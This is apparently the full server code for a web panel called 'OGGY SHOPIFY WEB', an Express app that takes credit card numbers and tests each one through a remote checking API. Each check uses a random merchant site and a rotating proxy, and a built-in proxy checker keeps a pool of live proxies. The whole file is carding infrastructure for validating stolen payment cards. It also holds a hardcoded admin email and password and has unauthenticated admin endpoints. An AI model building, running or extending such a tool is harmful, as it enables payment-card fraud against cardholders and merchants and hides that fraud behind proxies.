const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ─── GLOBAL MEMORY DATABASE ───
const db = {
  users: [
    { email: 'yousafcodes.de@gmail.com', pass: 'YOUSAFCODES.DE', role: 'admin', name: 'Oggy Admin', status: 'active', checked: 0 }
  ],
  sites: ['shopify.com', 'checkout.com'],
  proxies: [],
  inbox: [],
  activity: []
};

// ─── AUTH & USER MANAGEMENT ───
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.users.find(u => u.email === email && u.pass === password && u.status === 'active');
  if (user) res.json({ user: { email: user.email, name: user.name, role: user.role } });
  else res.status(401).json({ error: 'Invalid credentials' });
});

app.get('/api/users', (req, res) => res.json(db.users));

app.post('/api/register', (req, res) => {
  const { email, password, name, role } = req.body;
  if (db.users.find(u => u.email === email)) return res.status(400).json({ error: 'Email exists' });
  db.users.push({ email, pass: password, name, role: role || 'user', status: 'active', checked: 0 });
  res.json({ success: true });
});

app.post('/api/user/status', (req, res) => {
  const user = db.users.find(u => u.email === req.body.email);
  if (user) { user.status = req.body.status; res.json({ success: true }); }
  else res.status(404).json({ error: 'Not found' });
});

app.post('/api/user/delete', (req, res) => {
  db.users = db.users.filter(u => u.email !== req.body.email);
  res.json({ success: true });
});

// ─── ADMIN: SITES ───
app.get('/api/sites', (req, res) => res.json(db.sites));
app.post('/api/sites', (req, res) => {
  db.sites = req.body.sites;
  res.json({ success: true });
});

// ─── ADMIN: PROXY CHECKER ───
app.get('/api/proxies', (req, res) => res.json(db.proxies));

app.post('/api/check-proxies', async (req, res) => {
  const { proxies } = req.body;
  if (!proxies || !proxies.length) return res.json({ success: true, live: 0, total: db.proxies.length });

  let liveProxies = [];

  const formatProxy = (proxyStr) => {
    const parts = proxyStr.trim().split(':');
    if (parts.length === 4) return `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
    if (parts.length === 2) return `http://${parts[0]}:${parts[1]}`;
    return null;
  };

  const checkProxy = async (rawProxy) => {
    const formatted = formatProxy(rawProxy);
    if (!formatted) return;
    try {
      const agent = new HttpsProxyAgent(formatted);
      await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 10000 });
      liveProxies.push(rawProxy);
    } catch (err) {
      // failed, skip
    }
  };

  await Promise.allSettled(proxies.map(p => checkProxy(p)));

  db.proxies = [...new Set([...db.proxies, ...liveProxies])];

  res.json({ success: true, live: liveProxies.length, total: db.proxies.length });
});

// ─── MAIN CHECKER ───
app.get('/api/check', async (req, res) => {
  const { cc } = req.query;
  if (!cc) return res.status(400).json({ error: 'Missing CC' });

  const site = db.sites.length > 0 ? db.sites[Math.floor(Math.random() * db.sites.length)] : 'shopify.com';
  const proxy = db.proxies.length > 0 ? db.proxies[Math.floor(Math.random() * db.proxies.length)] : '';

  const targetUrl = new URL('https://check.yzio.app/shopify');
  targetUrl.searchParams.append('site', site);
  targetUrl.searchParams.append('cc', cc);
  if (proxy) targetUrl.searchParams.append('proxy', proxy);

  try {
    const response = await axios.get(targetUrl.toString(), { timeout: 25000 });
    res.json(response.data);
  } catch (err) {
    res.status(500).json({ status: 'unknown', message: 'API connection failed' });
  }
});

// ─── REPORTING ───
app.post('/api/report', (req, res) => {
  const { user, cc, message } = req.body;
  db.inbox.unshift({ user, cc, message, time: new Date().toISOString() });
  res.json({ success: true });
});

app.post('/api/activity', (req, res) => {
  const { user, card, result } = req.body;
  db.activity.unshift({ user, action: 'check', card, result, time: new Date().toISOString() });
  if (db.activity.length > 500) db.activity.pop();
  const u = db.users.find(x => x.email === user);
  if (u) u.checked = (u.checked || 0) + 1;
  res.json({ success: true });
});

app.get('/api/admin/data', (req, res) => {
  res.json({ inbox: db.inbox, activity: db.activity });
});

app.get('/api/health', (req, res) => res.json({ status: 'ok', name: 'OGGY SHOPIFY WEB' }));

// ─── SERVE FRONTEND ───
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => console.log(`OGGY SHOPIFY WEB running on port ${PORT}`));
